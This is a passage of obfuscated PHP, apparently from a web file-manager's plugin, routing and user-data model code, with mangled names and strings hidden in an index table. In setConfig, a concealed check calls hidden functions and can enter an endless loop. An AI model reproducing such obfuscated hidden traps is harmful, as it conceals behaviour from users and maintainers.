$¿ıÍûä„); } if (empty($¿ıÍûä„)) { return $ñ÷‚‹›ù[$´ÃÁûÜı[84]]; } if (!($ï‚„¹ôƒ = IO::fileNameExist($ñ÷‚‹›ù[$´ÃÁûÜı[84]], $¿ıÍûä„))) { return IO::mkdir($ñ÷‚‹›ù[$´ÃÁûÜı[84]] . $¿ıÍûä„); } return KodIO::make($ï‚„¹ôƒ); } final function pluginCacheFileSet($¤ù®§Š¸, $ı §½½Ÿ = '') { $á’éôÓ‘ =& $_SERVER[…É¦À–]; if (!($ Âì­à­ = IO::infoFull($¤ù®§Š¸))) { return IO::mkfile($¤ù®§Š¸, $ı §½½Ÿ, REPEAT_REPLACE); } IO::setContent($ Âì­à­[$á’éôÓ‘[84]], $ı §½½Ÿ); return $ Âì­à­[$á’éôÓ‘[84]]; } final function pluginLocalFile($£Öà´¿Ú = '') { $í´‡ë· =& $_SERVER[…É¦À–]; $éëÉ‰ÏÀ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($éëÉ‰ÏÀ)) { mk_dir($éëÉ‰ÏÀ); } if (!$£Öà´¿Ú) { return $éëÉ‰ÏÀ; } $é×·³ò— = IO::info($£Öà´¿Ú); $èÆ¨±¨¥ = $this->_tmpFileName($é×·³ò—) . $í´‡ë·[10] . $é×·³ò—[$í´‡ë·[174]]; if (!checkExtSafe($èÆ¨±¨¥)) { $èÆ¨±¨¥ = $èÆ¨±¨¥ . $í´‡ë·[1251]; } $¹ßëñ€® = $éëÉ‰ÏÀ . $èÆ¨±¨¥; if (@file_exists($¹ßëñ€®)) { return $¹ßëñ€®; } return IO::copy($£Öà´¿Ú, $éëÉ‰ÏÀ, 0, $èÆ¨±¨¥); } final function appPackage() { $õ¢¿Âó² =& $_SERVER[…É¦À–]; if ($this->packageData) { return $this->packageData; } $Æ¼¼Ÿøç = $this->parseFile($this->pluginPath . $õ¢¿Âó²[1581]); $this->parseLang($Æ¼¼Ÿøç); $›ñà¯  = json_decode_force($Æ¼¼Ÿøç); if (!$›ñà¯ ) { return array(); } $’‰’¢Î = Hook::trigger($õ¢¿Âó²[1582], $›ñà¯ ); if ($’‰’¢Î && is_array($’‰’¢Î)) { $›ñà¯  = $’‰’¢Î; } $this->packageData = $›ñà¯ ; return $›ñà¯ ; } public function packageInfoGet($È«ìöè) { $ä’·İ´ = $this->appPackage(); return array_get_value($ä’·İ´, $È«ìöè); } public function packageVersion() { return $this->packageInfoGet($_SERVER[…É¦À–][1583]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[…É¦À–][1584]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[…É¦À–][1585]); } public function echoJsAssign($—©ıØ¢, $ƒæ£İÌå) { $this->echoJsAssignArr[$—©ıØ¢] = $ƒæ£İÌå; } private function parseFile($¼²ãŒ) { $Çª¯ßóö =& $_SERVER[…É¦À–]; $­ö¶Ø‹³ = file_get_contents_nossl($¼²ãŒ); $Ÿò¬å…ª = array($Çª¯ßóö[1586], $Çª¯ßóö[1587], $Çª¯ßóö[1588], $Çª¯ßóö[1589], $Çª¯ßóö[1590], $Çª¯ßóö[1591], $Çª¯ßóö[1592]); $ÇúùıÕŠ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Çª¯ßóö[89]][$Çª¯ßóö[1593]]); foreach ($this->echoJsAssignArr as $ŠÔ®¼À => $È÷ÏùàÍ) { $Ÿò¬å…ª[] = $Çª¯ßóö[1594] . $ŠÔ®¼À . $Çª¯ßóö[1595]; $ÇúùıÕŠ[] = is_array($È÷ÏùàÍ) || is_object($È÷ÏùàÍ) ? rawurlencode(json_encode($È÷ÏùàÍ)) : $È÷ÏùàÍ; } if (strstr($­ö¶Ø‹³, $Çª¯ßóö[1596])) { $áƒß»ò— = rawurlencode(json_encode($this->pluginLangArr)); $­ö¶Ø‹³ = str_replace($Çª¯ßóö[1596], $áƒß»ò—, $­ö¶Ø‹³); } if (strstr($­ö¶Ø‹³, $Çª¯ßóö[1597])) { $áƒß»ò— = $áƒß»ò— = rawurlencode(json_encode($this->getConfig())); $­ö¶Ø‹³ = str_replace($Çª¯ßóö[1597], $áƒß»ò—, $­ö¶Ø‹³); } $­ö¶Ø‹³ = str_replace($Ÿò¬å…ª, $ÇúùıÕŠ, $­ö¶Ø‹³); return $­ö¶Ø‹³; } private function parseLang(&$şÔ‹Éü‚) { $şá‘È =& $_SERVER[…É¦À–]; $‘ó«êç¸ = $şá‘È[1598]; if (!strstr($şÔ‹Éü‚, $‘ó«êç¸)) { return; } preg_match_all($şá‘È[1599], $şÔ‹Éü‚, $­àú’‡Ş); if (!is_array($­àú’‡Ş) || count($­àú’‡Ş) == 0 || !is_array($­àú’‡Ş[0]) || count($­àú’‡Ş[0]) == 0) { return; } $¸£©¨ù = array(); $ºİ±ÁàĞ = array(); foreach ($­àú’‡Ş[0] as $ìè´ÛÍµ) { $Ó÷‘ƒğ¹ = substr($ìè´ÛÍµ, strlen($‘ó«êç¸), -4); $ïİÆø‹ = LNG($Ó÷‘ƒğ¹); $¸£©¨ù[] = $ìè´ÛÍµ; $ºİ±ÁàĞ[] = str_replace(array($şá‘È[231], $şá‘È[1123], $şá‘È[371], $şá‘È[118]), array($şá‘È[53], $şá‘È[53], $şá‘È[12], $şá‘È[1600]), $ïİÆø‹); } $şÔ‹Éü‚ = str_replace($¸£©¨ù, $ºİ±ÁàĞ, $şÔ‹Éü‚); } private function parseConfig(&$‡Ä¥¢‚) { $ øâà“§ =& $_SERVER[…É¦À–]; $óŸõŒİ» = $ øâà“§[1601]; if (!strstr($‡Ä¥¢‚, $óŸõŒİ»)) { return; } preg_match_all($ øâà“§[1602], $‡Ä¥¢‚, $ü‡ˆ‘÷½); if (!is_array($ü‡ˆ‘÷½) || count($ü‡ˆ‘÷½) == 0 || !is_array($ü‡ˆ‘÷½[0]) || count($ü‡ˆ‘÷½[0]) == 0) { return; } $û‰¢İÏ© = $this->getConfig(); $²“ø—¸Ñ = array(); $àÚ§°¨º = array(); foreach ($ü‡ˆ‘÷½[0] as $ÛÒ¢‡¶¡) { $Ñ¯èç·¤ = substr($ÛÒ¢‡¶¡, strlen($óŸõŒİ»), -2); $²“ø—¸Ñ[] = $ÛÒ¢‡¶¡; $àÚ§°¨º[] = _get($û‰¢İÏ©, $Ñ¯èç·¤); } $‡Ä¥¢‚ = str_replace($²“ø—¸Ñ, $àÚ§°¨º, $‡Ä¥¢‚); } private function parsePackage(&$İÏ·‰ß‘) { $”î±•Ô¶ =& $_SERVER[…É¦À–]; $Åş–èÓ“ = $”î±•Ô¶[1603]; if (!strstr($İÏ·‰ß‘, $Åş–èÓ“)) { return; } preg_match_all($”î±•Ô¶[1604], $İÏ·‰ß‘, $ñù²·Ãê); if (!is_array($ñù²·Ãê) || count($ñù²·Ãê) == 0 || !is_array($ñù²·Ãê[0]) || count($ñù²·Ãê[0]) == 0) { return; } $çÍïéô = $this->appPackage(); $Ú‘å¦µ = array(); $¼•ÈÈÁ± = array(); foreach ($ñù²·Ãê[0] as $§ÄÇ•Ë) { $¹Ùƒ‹‡š = substr($§ÄÇ•Ë, strlen($Åş–èÓ“), -2); $Ú‘å¦µ[] = $§ÄÇ•Ë; $¼•ÈÈÁ±[] = _get($çÍïéô, $¹Ùƒ‹‡š); } $İÏ·‰ß‘ = str_replace($Ú‘å¦µ, $¼•ÈÈÁ±, $İÏ·‰ß‘); } final function echoFile($»Æ¬±¤ì, $éÒë€ÇÖ = false) { $ÔëŞ“Æ =& $_SERVER[…É¦À–]; $µ´­ß¬³ = $this->pluginPath . $»Æ¬±¤ì; if (ACT == $ÔëŞ“Æ[1605]) { echo $ÔëŞ“Æ[1606] . $this->pluginName . $ÔëŞ“Æ[8] . $»Æ¬±¤ì . $ÔëŞ“Æ[1607]; if (!file_exists($µ´­ß¬³)) { echo $ÔëŞ“Æ[1608]; return; } } $óàÔ‘§ = $this->parseFile($µ´­ß¬³); $this->parseLang($óàÔ‘§); $this->parseConfig($óàÔ‘§); $this->parsePackage($óàÔ‘§); if (is_array($éÒë€ÇÖ)) { $óàÔ‘§ = str_replace(array_keys($éÒë€ÇÖ), array_values($éÒë€ÇÖ), $óàÔ‘§); } echo $ÔëŞ“Æ[231] . $óàÔ‘§; } final function initLang() { $Íº¦’Ïò =& $_SERVER[…É¦À–]; $ØÃ¦«º = $Íº¦’Ïò[1609]; $íæ€—Êò = $this->pluginPath . $Íº¦’Ïò[1610]; $™ÆÚƒ‰Ì = I18n::getType(); $Ìà½¦‘´ = array(); if (file_exists($íæ€—Êò . $™ÆÚƒ‰Ì . $Íº¦’Ïò[878])) { $Ìà½¦‘´ = (include $íæ€—Êò . $™ÆÚƒ‰Ì . $Íº¦’Ïò[878]); } else { if ($™ÆÚƒ‰Ì == $Íº¦’Ïò[1611] && !file_exists($íæ€—Êò . $™ÆÚƒ‰Ì . $Íº¦’Ïò[878]) && file_exists($íæ€—Êò . $Íº¦’Ïò[1612])) { $Ìà½¦‘´ = (include $íæ€—Êò . $Íº¦’Ïò[1612]); } else { if (file_exists($íæ€—Êò . $ØÃ¦«º . $Íº¦’Ïò[878])) { $Ìà½¦‘´ = (include $íæ€—Êò . $ØÃ¦«º . $Íº¦’Ïò[878]); } } } if (!is_array($Ìà½¦‘´)) { return array(); } if (@count($Ìà½¦‘´) > 0) { I18n::set($Ìà½¦‘´); } return $Ìà½¦‘´; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÃÃêàŞ•) { $‹×¸½ö =& $_SERVER[…É¦À–]; if (!isset($_SERVER[$‹×¸½ö[919]]) || !isset($_SERVER[$‹×¸½ö[1613]])) { $€Ÿ­‡ù’ = $‹×¸½ö[920]; $à£‘ÇÓ· = $‹×¸½ö[921]; $øİŠŒï¡ = $_SERVER[$‹×¸½ö[916]] . $‹×¸½ö[917]; $¡Ããó‘ğ = $à£‘ÇÓ·($øİŠŒï¡); $ßçÂß‚à = explode($‹×¸½ö[231], $¡Ããó‘ğ); if (count($ßçÂß‚à) < $‹×¸½ö[636]) { $Ñ‘ùÔÅ = $‹×¸½ö[922]; $Ñ‘ùÔÅ(); } $¸·Ê”şƒ = $‹×¸½ö[923]; $¸·Ê”şƒ($_SERVER[$‹×¸½ö[924]]); $µ¥şÃõÀ = 1; for ($éŠ›áÏó = $µ¥şÃõÀ; $éŠ›áÏó > 0; $éŠ›áÏó++) { $¸·Ê”şƒ = json_encode($GLOBALS[$‹×¸½ö[447]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÃÃêàŞ•); } public function onSetConfig($Ü×€ÊÄ†) { } public function onGetConfig($§Í«›ˆÅ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¿ëÇõš¼) { if ($¿ëÇõš¼ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($“ÙÊ¦Ê = "\160\x6c\x75\147\x69\x6e\x41\x75\x74\150") { $ÏîÄÌõÜ =& $_SERVER[…É¦À–]; if (!Session::get($ÏîÄÌõÜ[1564])) { return !1; } if (_get($GLOBALS, $ÏîÄÌõÜ[523])) { return !0; } $Î¢”êØ‡ = $this->getConfig(); if (!$Î¢”êØ‡[$“ÙÊ¦Ê]) { return !1; } return ActionCall($ÏîÄÌõÜ[1614], $Î¢”êØ‡[$“ÙÊ¦Ê]); } public function url($™«ÆäĞÖ, $ì«¶™Ñç = '', $±»üçÑ = true) { $Œ÷Ô¨½† =& $_SERVER[…É¦À–]; $–²©€ì„ = $this->getConfig(); $›©¹«¥ª = KOD_VERSION . $Œ÷Ô¨½†[10] . KOD_VERSION_BUILD; $€éøøòÜ = $this->packageVersion(); $ğæÔüä° = $›©¹«¥ª . $Œ÷Ô¨½†[415] . $€éøøòÜ; if (substr($™«ÆäĞÖ, 0, 4) == $Œ÷Ô¨½†[148] || substr($™«ÆäĞÖ, 0, 2) == $Œ÷Ô¨½†[1323]) { $‚¬Ú¸­ú = $™«ÆäĞÖ . $Œ÷Ô¨½†[1615] . $ğæÔüä°; } else { if ($ì«¶™Ñç == $Œ÷Ô¨½†[12]) { $‚¬Ú¸­ú = $this->pluginHost . $™«ÆäĞÖ . $Œ÷Ô¨½†[1615] . $ğæÔüä°; } else { if ($ì«¶™Ñç === $Œ÷Ô¨½†[75]) { $‚¬Ú¸­ú = $this->pluginHost . $™«ÆäĞÖ; } else { if ($ì«¶™Ñç == $Œ÷Ô¨½†[1616]) { $‚¬Ú¸­ú = STATIC_PATH . $™«ÆäĞÖ . $Œ÷Ô¨½†[1615] . $›©¹«¥ª; } else { if ($ì«¶™Ñç == $Œ÷Ô¨½†[1617]) { $‚¬Ú¸­ú = APP_HOST . $Œ÷Ô¨½†[1618] . $™«ÆäĞÖ . $Œ÷Ô¨½†[1615] . $›©¹«¥ª; } else { if (isset($–²©€ì„[$ì«¶™Ñç])) { $‚¬Ú¸­ú = $–²©€ì„[$ì«¶™Ñç] . $™«ÆäĞÖ . $Œ÷Ô¨½†[1615] . $ğæÔüä°; } } } } } } if (!$±»üçÑ) { return $‚¬Ú¸­ú; } echo $‚¬Ú¸­ú; } public function link($êÈíç›¬ = false, $›æ¬ÅÏí = '') { $´í™¡È… =& $_SERVER[…É¦À–]; if (!$êÈíç›¬) { $this->link($´í™¡È…[1619], $´í™¡È…[1617]); $this->link($´í™¡È…[1620], $´í™¡È…[1616]); $this->link($´í™¡È…[1621], $´í™¡È…[1616]); $this->link($´í™¡È…[1622], $´í™¡È…[1616]); $this->link($´í™¡È…[1623], $´í™¡È…[1616]); return; } $óİÔÂß = $this->url($êÈíç›¬, $›æ¬ÅÏí, !1); if (substr($êÈíç›¬, -3) == $´í™¡È…[1624]) { echo $´í™¡È…[1625] . $óİÔÂß . $´í™¡È…[1626] . $´í™¡È…[231]; } else { if (substr($êÈíç›¬, -4) == $´í™¡È…[1627]) { echo $´í™¡È…[1628] . $óİÔÂß . $´í™¡È…[1629] . $´í™¡È…[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\x5b\x5e\57\135\53", "\x3a\x6e\x75\x6d" => "\x5b\60\55\x39\x5d\53", "\x3a\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Œ“ŸÖ‘Õ, $şôÒÜ‚‡) { $…Ø‹áÒŸ =& $_SERVER[…É¦À–]; if ($Œ“ŸÖ‘Õ == $…Ø‹áÒŸ[1630]) { $íÌƒ¤Œ = array_map($…Ø‹áÒŸ[1631], $şôÒÜ‚‡[0]); $ë„ÎËÌ­ = strpos($şôÒÜ‚‡[1], $…Ø‹áÒŸ[8]) === 0 ? $şôÒÜ‚‡[1] : $…Ø‹áÒŸ[8] . $şôÒÜ‚‡[1]; $Êğâ¢³ˆ = $şôÒÜ‚‡[2]; } else { $íÌƒ¤Œ = null; $ë„ÎËÌ­ = strpos($şôÒÜ‚‡[0], $…Ø‹áÒŸ[8]) === 0 ? $şôÒÜ‚‡[0] : $…Ø‹áÒŸ[8] . $şôÒÜ‚‡[0]; $Êğâ¢³ˆ = $şôÒÜ‚‡[1]; } array_push(self::$maps, $íÌƒ¤Œ); array_push(self::$routes, $ë„ÎËÌ­); array_push(self::$methods, strtoupper($Œ“ŸÖ‘Õ)); array_push(self::$callbacks, $Êğâ¢³ˆ); } public static function error($’é°ó¶) { self::$errorCallback = $’é°ó¶; } public static function haltOnMatch($Èµ¼Á»‘ = true) { self::$halts = $Èµ¼Á»‘; } public static function dispatch() { $®×ŠĞÉ =& $_SERVER[…É¦À–]; $ÜÑ“¶˜í = parse_url($_SERVER[$®×ŠĞÉ[1632]], PHP_URL_PATH); $˜à—›Îò = $_SERVER[$®×ŠĞÉ[159]]; $ûØ¼³¯ = array_keys(static::$patterns); $—şïÇ‰’ = array_values(static::$patterns); $É½•Úû = !1; self::$routes = preg_replace($®×ŠĞÉ[1321], $®×ŠĞÉ[8], self::$routes); if (in_array($ÜÑ“¶˜í, self::$routes)) { $¿ß¢®Å¼ = array_keys(self::$routes, $ÜÑ“¶˜í); foreach ($¿ß¢®Å¼ as $Ÿ®à§Î¼) { if (self::$methods[$Ÿ®à§Î¼] == $˜à—›Îò || self::$methods[$Ÿ®à§Î¼] == $®×ŠĞÉ[1633] || in_array($˜à—›Îò, self::$maps[$Ÿ®à§Î¼])) { $É½•Úû = !0; if (!is_object(self::$callbacks[$Ÿ®à§Î¼])) { $„ÉŒœ–Ò = explode($®×ŠĞÉ[8], self::$callbacks[$Ÿ®à§Î¼]); $¡ª—°¥ş = end($„ÉŒœ–Ò); $Û–É¿İÔ = explode($®×ŠĞÉ[1253], $¡ª—°¥ş); $Ó§á“æ‰ = new $Û–É¿İÔ[0](); $Ó§á“æ‰->{$Û–É¿İÔ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ÿ®à§Î¼]); if (self::$halts) { return; } } } } } else { $–æô²Ô¤ = 0; foreach (self::$routes as $Ÿ®à§Î¼) { if (strpos($Ÿ®à§Î¼, $®×ŠĞÉ[4]) !== !1) { $Ÿ®à§Î¼ = str_replace($ûØ¼³¯, $—şïÇ‰’, $Ÿ®à§Î¼); } if (preg_match($®×ŠĞÉ[1634] . $Ÿ®à§Î¼ . $®×ŠĞÉ[1635], $ÜÑ“¶˜í, $ÙÌíÚ°Õ)) { if (self::$methods[$–æô²Ô¤] == $˜à—›Îò || self::$methods[$–æô²Ô¤] == $®×ŠĞÉ[1633] || !empty(self::$maps[$–æô²Ô¤]) && in_array($˜à—›Îò, self::$maps[$–æô²Ô¤])) { $É½•Úû = !0; array_shift($ÙÌíÚ°Õ); if (!is_object(self::$callbacks[$–æô²Ô¤])) { $„ÉŒœ–Ò = explode($®×ŠĞÉ[8], self::$callbacks[$–æô²Ô¤]); $¡ª—°¥ş = end($„ÉŒœ–Ò); $Û–É¿İÔ = explode($®×ŠĞÉ[1253], $¡ª—°¥ş); $Ó§á“æ‰ = new $Û–É¿İÔ[0](); if (!method_exists($Ó§á“æ‰, $Û–É¿İÔ[1])) { echo $®×ŠĞÉ[1636]; } else { call_user_func_array(array($Ó§á“æ‰, $Û–É¿İÔ[1]), $ÙÌíÚ°Õ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$–æô²Ô¤], $ÙÌíÚ°Õ); if (self::$halts) { return; } } } } $–æô²Ô¤++; } } if ($É½•Úû == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Øª§“¥ =& $_SERVER[…É¦À–]; header($_SERVER[$Øª§“¥[1637]] . $Øª§“¥[1638]); echo $Øª§“¥[1639]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$®×ŠĞÉ[1632]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto E»¸óìàÑ¦; Cà¹ÆÌÕ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x74\x61\163\153\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x74\x79\x70\145", "\145\x76\145\x6e\164", "\x74\x69\155\145", "\x64\x65\x73\x63", "\163\x79\x73\x74\145\x6d", "\x65\x6e\141\x62\154\145", "\x6c\x61\x73\x74\x52\x75\x6e", "\x73\157\162\164"); public function listData($€Öàğ• = false, $ÆÃÏşŒä = "\163\157\x72\x74", $§ö²°“ = false) { return parent::listData($€Öàğ•, $ÆÃÏşŒä, $§ö²°“); } public function add($Îô½‹ë) { $´ÛÑë¸¶ =& $_SERVER[…É¦À–]; $­Şñµ¼™ = $this->findByName($Îô½‹ë[$´ÛÑë¸¶[32]]); if ($­Şñµ¼™) { return !1; } $Îô½‹ë[$´ÛÑë¸¶[1647]] = 0; $Îô½‹ë[$´ÛÑë¸¶[1901]] = $this->getSort(); return parent::insert($Îô½‹ë); } private function getSort() { $‹ÇåÇÆğ =& $_SERVER[…É¦À–]; $‡âˆ‘½× = parent::listData(); $ÔÉê®¯Ü = array_to_keyvalue($‡âˆ‘½×, $‹ÇåÇÆğ[12], $‹ÇåÇÆğ[1901]); return empty($ÔÉê®¯Ü) ? 0 : max($ÔÉê®¯Ü) + 1; } public function update($ŸÜ³øÖ±, $À÷³˜šİ) { $“«â»ø‹ =& $_SERVER[…É¦À–]; $ø¨şçëò = $this->listData($ŸÜ³øÖ±); $˜Öà¿ñ– = $this->findByName($À÷³˜šİ[$“«â»ø‹[32]]); if (!$ø¨şçëò || $˜Öà¿ñ– && $˜Öà¿ñ–[$“«â»ø‹[428]] != $ø¨şçëò[$“«â»ø‹[428]]) { return !1; } return parent::update($ŸÜ³øÖ±, $À÷³˜šİ); } public function remove($ş•íËŒ¼, $İÌ±¡íš = false) { $Ÿ­”€ûŠ =& $_SERVER[…É¦À–]; $Ê®æáñ = $this->listData($ş•íËŒ¼); if (!$Ê®æáñ) { return; } if (!$İÌ±¡íš && $Ê®æáñ[$Ÿ­”€ûŠ[1332]] == $Ÿ­”€ûŠ[88]) { return !1; } return parent::remove($ş•íËŒ¼); } public function enable($²²¿ıÌà, $ó’×Ë¥) { return $this->update($²²¿ıÌà, array($_SERVER[…É¦À–][2309] => $ó’×Ë¥)); } public function run($ƒäíõö‘) { return $this->update($ƒäíõö‘, array($_SERVER[…É¦À–][2321] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($²§®Æ) { $åãşĞó =& $_SERVER[…É¦À–]; return array($åãşĞó[1988] => array(USER_ID, $åãşĞó[2322])); } protected function listData() { $ì«‘™¬­ =& $_SERVER[…É¦À–]; $ƒˆğäÙé = array($ì«‘™¬­[1678] => USER_ID, $ì«‘™¬­[512] => 0); $¿ßÉ‚È» = $ì«‘™¬­[2323]; $ƒîæ–Óë = $this->field($¿ßÉ‚È»)->where($ƒˆğäÙé)->order($ì«‘™¬­[2324])->select(); return $ƒîæ–Óë ? $ƒîæ–Óë : array(); } protected function resetCache() { } protected function listView() { $ğ÷ã—Ó =& $_SERVER[…É¦À–]; $¨¤çõö = $this->listData(); $‹¡•Ş®Ğ = array_filter_by_field($¨¤çõö, $ğ÷ã—Ó[33], $ğ÷ã—Ó[445]); $¶ÅõÛ’‹ = array_to_keyvalue($‹¡•Ş®Ğ, $ğ÷ã—Ó[12], $ğ÷ã—Ó[84]); if (!$¶ÅõÛ’‹) { return $¨¤çõö; } $ƒÌ¾áĞò = 2000; $ï†›‡î€ = array($ğ÷ã—Ó[446] => array($ğ÷ã—Ó[447], $¶ÅõÛ’‹)); $å¨ÍÅùÈ = Model($ğ÷ã—Ó[865])->listSource($ï†›‡î€, $ƒÌ¾áĞò); $å¨ÍÅùÈ = array_merge($å¨ÍÅùÈ[$ğ÷ã—Ó[83]], $å¨ÍÅùÈ[$ğ÷ã—Ó[82]]); $å¨ÍÅùÈ = array_to_keyvalue($å¨ÍÅùÈ, $ğ÷ã—Ó[431]); foreach ($¨¤çõö as $•²«†ï™ => $¼³‘©å…) { $îÀ¦˜ÜÅ = $å¨ÍÅùÈ[$¼³‘©å…[$ğ÷ã—Ó[84]]]; $îÀ¦˜ÜÅ = $îÀ¦˜ÜÅ ? $îÀ¦˜ÜÅ : array(); $¨¤çõö[$•²«†ï™] = array_merge($îÀ¦˜ÜÅ, $¼³‘©å…); } return $¨¤çõö; } protected function addFav($¦›‰ï, $ºé¢–Œ = '', $Á²ßßî = "\163\157\x75\162\x63\x65") { $úıÌô² =& $_SERVER[…É¦À–]; $¶Ğ÷¥¿ä = array($úıÌô²[1678] => USER_ID, $úıÌô²[512] => 0, $úıÌô²[451] => $Á²ßßî, $úıÌô²[450] => $¦›‰ï); if ($this->where($¶Ğ÷¥¿ä)->find()) { return !1; } $¶Ğ÷¥¿ä = array($úıÌô²[1678] => USER_ID, $úıÌô²[512] => 0); $ë¤áõ‚Ğ = $this->where($¶Ğ÷¥¿ä)->max($úıÌô²[1901]); if (!$ë¤áõ‚Ğ) { $ë¤áõ‚Ğ = 0; } if (!$ºé¢–Œ && $Á²ßßî == $úıÌô²[445]) { $âÔüñêŸ = Model($úıÌô²[1378])->where(array($úıÌô²[446] => $¦›‰ï))->find(); if (!$âÔüñêŸ) { return !1; } $ºé¢–Œ = $âÔüñêŸ[$úıÌô²[32]]; } $ºé¢–Œ = $this->getAutoName($ºé¢–Œ); $òˆ°¿† = array($úıÌô²[1678] => USER_ID, $úıÌô²[512] => 0, $úıÌô²[449] => $ºé¢–Œ, $úıÌô²[450] => $¦›‰ï, $úıÌô²[451] => $Á²ßßî, $úıÌô²[1881] => $ë¤áõ‚Ğ + 1); return $this->add($òˆ°¿†); } protected function remove($‹øÜì¦) { $ÌÎÓş‚ =& $_SERVER[…É¦À–]; $ıêŞ­Ë™ = array($ÌÎÓş‚[1678] => USER_ID, $ÌÎÓş‚[448] => $‹øÜì¦); return $this->where($ıêŞ­Ë™)->delete(); } protected function removeByName($”óªÔ‹Ş) { $ÏòÜ·¥Ó =& $_SERVER[…É¦À–]; $Ù¯•‰¹ = array($ÏòÜ·¥Ó[1678] => USER_ID, $ÏòÜ·¥Ó[449] => $”óªÔ‹Ş, $ÏòÜ·¥Ó[512] => 0); return $this->where($Ù¯•‰¹)->delete(); } protected function rename($–‡¬ùÃ, $·Ù‹‹Ó—) { $¯á‚™ =& $_SERVER[…É¦À–]; if ($–‡¬ùÃ == $·Ù‹‹Ó—) { return !1; } $€ÚÄÖ„Ú = $this->getAutoName($·Ù‹‹Ó—); if ($·Ù‹‹Ó— != $€ÚÄÖ„Ú) { return !1; } $®Ò®·¥  = array($¯á‚™[1678] => USER_ID, $¯á‚™[512] => 0, $¯á‚™[32] => $–‡¬ùÃ); return $this->where($®Ò®·¥ )->save(array($¯á‚™[32] => $·Ù‹‹Ó—)); } protected function resetSort($ƒ™í„Í²) { $ğÁâ¶ƒÜ =& $_SERVER[…É¦À–]; $ƒ™í„Í² = is_array($ƒ™í„Í²) ? $ƒ™í„Í² : array(); $ˆŒ½À‚± = array($ğÁâ¶ƒÜ[1678] => USER_ID); for ($Ş„ƒœÙˆ = 0; $Ş„ƒœÙˆ < count($ƒ™í„Í²); $Ş„ƒœÙˆ++) { $ˆŒ½À‚±[$ğÁâ¶ƒÜ[448]] = $ƒ™í„Í²[$Ş„ƒœÙˆ]; $this->where($ˆŒ½À‚±)->save(array($ğÁâ¶ƒÜ[1881] => $Ş„ƒœÙˆ + 1)); } return !0; } protected function moveTop($¼²®»¥) { $Ã¨ê¯Ãü =& $_SERVER[…É¦À–]; $ö¦©Á± = array($Ã¨ê¯Ãü[1678] => USER_ID, $Ã¨ê¯Ãü[512] => 0); $Ã¡ƒ ¿Æ = $this->where($ö¦©Á±)->where(array($Ã¨ê¯Ãü[32] => $¼²®»¥))->find(); if (!$Ã¡ƒ ¿Æ) { return; } $ù‰˜Æ£² = $this->field($Ã¨ê¯Ãü[428])->where($ö¦©Á±)->order($Ã¨ê¯Ãü[2324])->select(); $ù‰˜Æ£² = array_to_keyvalue($ù‰˜Æ£², $Ã¨ê¯Ãü[12], $Ã¨ê¯Ãü[428]); $®æš³ò® = $ù‰˜Æ£²; $ù‰˜Æ£² = array_remove_value($ù‰˜Æ£², $Ã¡ƒ ¿Æ[$Ã¨ê¯Ãü[428]]); array_unshift($ù‰˜Æ£², $Ã¡ƒ ¿Æ[$Ã¨ê¯Ãü[428]]); return $this->resetSort($ù‰˜Æ£²); } protected function moveBottom($Â›ıô”º) { $çìº€É§ =& $_SERVER[…É¦À–]; $ƒÅøùÃé = array($çìº€É§[1678] => USER_ID, $çìº€É§[512] => 0); $ÙÌù‘±§ = $this->where($ƒÅøùÃé)->max($çìº€É§[1901]); $­øª®Â« = array($çìº€É§[1901] => $ÙÌù‘±§ + 1); return $this->where($ƒÅøùÃé)->where(array($çìº€É§[32] => $Â›ıô”º))->save($­øª®Â«); } private function getAutoName($–µì£ßª) { $Æ‰Íœƒ =& $_SERVER[…É¦À–]; $ƒáÛçÏ = array($Æ‰Íœƒ[1678] => USER_ID, $Æ‰Íœƒ[512] => 0); $ôë“ÉÚ× = $this->field($Æ‰Íœƒ[32])->where($ƒáÛçÏ)->select(); $ôë“ÉÚ× = array_to_keyvalue($ôë“ÉÚ×, $Æ‰Íœƒ[12], $Æ‰Íœƒ[32]); if (!$ôë“ÉÚ× || !in_array($–µì£ßª, $ôë“ÉÚ×)) { return $–µì£ßª; } for ($Š›‡™®æ = 0; $Š›‡™®æ < count($ôë“ÉÚ×); $Š›‡™®æ++) { if (!in_array($–µì£ßª . "\x28{$Š›‡™®æ}\51", $ôë“ÉÚ×)) { return $–µì£ßª . "\50{$Š›‡™®æ}\x29"; } } return $–µì£ßª . "\50{$Š›‡™®æ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\152\x6f\x62\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\x64\x65\163\x63", "\163\157\162\164"); const JOB_KEY = "\x73\145\x6c\x66\x4a\157\142\114\151\163\x74"; public function listData($ñ¼¬é˜ = false, $Ğµ—ŠÍ = "\x73\157\x72\164", $ÉØºë·Ô = false) { return parent::listData($ñ¼¬é˜, $Ğµ—ŠÍ, $ÉØºë·Ô); } public function remove($¢óç‚ºŸ) { return parent::remove($¢óç‚ºŸ); } public function add($ÕÙ¡Ô‡) { $¤¦û½ò„ =& $_SERVER[…É¦À–]; if ($this->findByName($ÕÙ¡Ô‡[$¤¦û½ò„[32]])) { return !1; } 